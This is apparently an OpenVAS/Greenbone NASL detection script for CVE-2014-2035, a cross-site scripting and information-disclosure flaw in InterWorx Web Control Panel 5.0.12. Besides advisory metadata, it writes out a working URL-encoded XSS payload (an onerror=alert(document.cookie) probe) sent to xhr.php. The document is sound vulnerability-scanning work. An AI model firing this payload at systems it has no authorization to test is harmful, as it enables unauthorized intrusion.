if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804779" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-2035" );
	script_bugtraq_id( 65734 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-10-16 18:28:59 +0530 (Thu, 16 Oct 2014)" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "InterWorx Web Control Panel Information Disclosure and XSS Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with InterWorx Web
  Control Panel and is prone to information disclosure and xss vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to improper sanitization of
  user-supplied input passed via 'i' parameter to xhr.php and certain
  unspecified input passed to the SiteWorx interface." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code and disclose certain sensitive
  information in the context of an affected site." );
	script_tag( name: "affected", value: "InterWorx version 5.0.12 build 569,
  Other versions may also be affected." );
	script_tag( name: "solution", value: "Update to version 5.0.13 build 574 or later." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/57063" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/91443" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/125344" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/531191/100/0/threaded" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 2443 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.interworx.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 2443 );
for dir in nasl_make_list_unique( "/", "/nodeworx", "/interworx", http_cgi_dirs( port: 2443 ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/" ), port: http_port );
	if(ContainsString( rcvRes, "InterWorx-CP" )){
		url = dir + "/xhr.php?i=%7B%22r%22%3A%22Form_InputValidator%22%2C%22i%22%3A%7B" + "%22form%22%3A%22Form_NW_Shell_ForbiddenUsers%22%2C%22ctrl%22%3A%2" + "2%5C%2Fnodeworx%5C%2Fshell%3Cimg%20src%3Dx%20onerror%3Dalert(docu" + "ment.cookie)%3E%22%2C%22input%22%3A%22forbidden_unix_users%22%2C%" + "22value%22%3A%22moi%22%2C%22where_was_i%22%3A%22%2Fnodeworx%2Fshe" + "ll%22%7D%7D";
		sndReq = http_get( item: url, port: http_port );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "Onerror=alert(document.cookie)" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

